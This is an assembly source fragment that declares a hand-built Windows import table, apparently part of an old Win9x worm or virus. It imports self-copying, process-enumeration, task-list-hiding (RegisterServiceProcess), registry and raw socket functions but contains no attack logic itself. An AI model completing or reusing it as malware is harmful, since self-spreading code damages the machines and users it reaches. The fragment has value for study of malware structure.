import dd 0
       dd 0
forward_chain dd -1
       dd dll001+RVA_diff
       dd api001+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll002+RVA_diff
       dd api002+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll003+RVA_diff
       dd api003+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll004+RVA_diff
       dd api004+RVA_diff

       dd 0
       dd 0
       dd -1
       dd dll005+RVA_diff
       dd api005+RVA_diff

;       times 5 dd 0                ;NULL DLL ENTRY
vxdcall0_ dd 0
peheader_ dd 0
myexe_buf_ dd 0
myexe_size_ dd 0
       dd 0

  vxdcall0 equ vxdcall0_+run_RVA
  peheader equ peheader_+run_RVA
  myexe_buf equ myexe_buf_+run_RVA
  myexe_size equ myexe_size_+run_RVA

dll001 db "KERNEL32",0

dll002 db "ADVAPI32",0

dll003 db "WININET",0

dll004 db "WSOCK32",0

dll005 db "USER32",0

api001 dd api101+RVA_diff
       dd api102+RVA_diff
       dd api103+RVA_diff
       dd api104+RVA_diff
       dd api105+RVA_diff
       dd api106+RVA_diff
       dd api107+RVA_diff
       dd api108+RVA_diff
       dd api109+RVA_diff
       dd api110+RVA_diff
       dd api111+RVA_diff
       dd api112+RVA_diff
       dd api113+RVA_diff
       dd api114+RVA_diff
       dd api115+RVA_diff
       dd api116+RVA_diff
       dd api117+RVA_diff
       dd api118+RVA_diff
       dd api119+RVA_diff
       dd api120+RVA_diff
       dd api121+RVA_diff
       dd api122+RVA_diff
       dd api123+RVA_diff
       dd api124+RVA_diff
       dd 0

api002 dd api201+RVA_diff
       dd api202+RVA_diff
       dd api203+RVA_diff
       dd 0

api003 dd api301+RVA_diff
       dd 0

api004 dd api401+RVA_diff
       dd api402+RVA_diff
       dd api403+RVA_diff
       dd api404+RVA_diff
       dd api405+RVA_diff
       dd api406+RVA_diff
       dd api407+RVA_diff
       dd api408+RVA_diff
       dd 0

api005 dd api501+RVA_diff
%ifdef DEBUG
       dd api502+RVA_diff
%endif
       dw 0                    ;dd 0

api101 dw 0
       db "ExitProcess"
api102 dw 0
       db "GetModuleFileNameA"
api103 dw 0
       db "CopyFileA"
api104 dw 0
       db "Process32First"
api105 dw 0
       db "Process32Next"
api106 dw 0
       db "FindFirstFileA"
api107 dw 0
       db "FindNextFileA"
api108 dw 0
       db "RegisterServiceProcess"
api109 dw 0
       db "WinExec"
api110 dw 0
       db "Sleep"
api111 dw 0
       db "GetTickCount"
api112 dw 0
       db "CreateThread"
api113 dw 0
       db "SetFilePointer"
api114 dw 0
       db "GlobalAlloc"
api115 dw 0
       db "GetVersion"
api116 dw 0
       db "SetErrorMode"
api117 dw 0
       db "GetProcAddress"
api118 dw 0
       db "CreateFileA"
api119 dw 0
       db "ReadFile"
api120 dw 0
       db "CloseHandle"
api121 dw 0
       db "GetModuleHandleA"
api122 dw 0
       db "WriteFile"
api123 dw 0
       db "GlobalFindAtomA"
api124 dw 0
       db "GlobalAddAtomA"

api201 dw 0
       db "RegOpenKeyExA"
api202 dw 0
       db "RegCloseKey"
api203 dw 0
       db "RegQueryValueExA"

api301 dw 0
       db "InternetGetConnectedState"

api401 dw 0
       db "socket"
api402 dw 0
       db "connect"
api403 dw 0
       db "send"
api404 dw 0
       db "recv"
api405 dw 0
       db "closesocket"
api406 dw 0
       db "WSAStartup"
api407 dw 0
       db "WSACleanup"
api408 dw 0
       db "gethostbyname"

api501 dw 0
       db "PeekMessageA",0
%ifdef DEBUG
api502 dw 0
       db "MessageBoxA",0
%endif


ExitProcess            equ api001+imagebase+RVA_diff
GetModuleFileNameA     equ api001+imagebase+RVA_diff+4
CopyFileA              equ api001+imagebase+RVA_diff+8
Process32First         equ api001+imagebase+RVA_diff+12
Process32Next          equ api001+imagebase+RVA_diff+16
FindFirstFileA         equ api001+imagebase+RVA_diff+20
FindNextFileA          equ api001+imagebase+RVA_diff+24
RegisterServiceProcess equ api001+imagebase+RVA_diff+28
WinExec                equ api001+imagebase+RVA_diff+32
Sleep                  equ api001+imagebase+RVA_diff+36
GetTickCount           equ api001+imagebase+RVA_diff+40
CreateThread           equ api001+imagebase+RVA_diff+44
SetFilePointer         equ api001+imagebase+RVA_diff+48
GlobalAlloc            equ api001+imagebase+RVA_diff+52
GetVersion             equ api001+imagebase+RVA_diff+56
SetErrorMode           equ api001+imagebase+RVA_diff+60
GetProcAddress         equ api001+imagebase+RVA_diff+64
CreateFileA            equ api001+imagebase+RVA_diff+68
ReadFile               equ api001+imagebase+RVA_diff+72
CloseHandle            equ api001+imagebase+RVA_diff+76
GetModuleHandleA       equ api001+imagebase+RVA_diff+80
WriteFile              equ api001+imagebase+RVA_diff+84
GlobalFindAtomA        equ api001+imagebase+RVA_diff+88
GlobalAddAtomA         equ api001+imagebase+RVA_diff+92

RegOpenKeyExA    equ api002+imagebase+RVA_diff
RegCloseKey      equ api002+imagebase+RVA_diff+4
RegQueryValueExA equ api002+imagebase+RVA_diff+8

InternetGetConnectedState equ api003+imagebase+RVA_diff

socket      equ api004+imagebase+RVA_diff
connect     equ api004+imagebase+RVA_diff+4
send        equ api004+imagebase+RVA_diff+8
recv        equ api004+imagebase+RVA_diff+12
closesocket equ api004+imagebase+RVA_diff+16
WSAStartup  equ api004+imagebase+RVA_diff+20
WSACleanup  equ api004+imagebase+RVA_diff+24
gethostbyname equ api004+imagebase+RVA_diff+28

PeekMessageA equ api005+imagebase+RVA_diff
%ifdef DEBUG
MessageBoxA equ api005+imagebase+RVA_diff+4
%endif
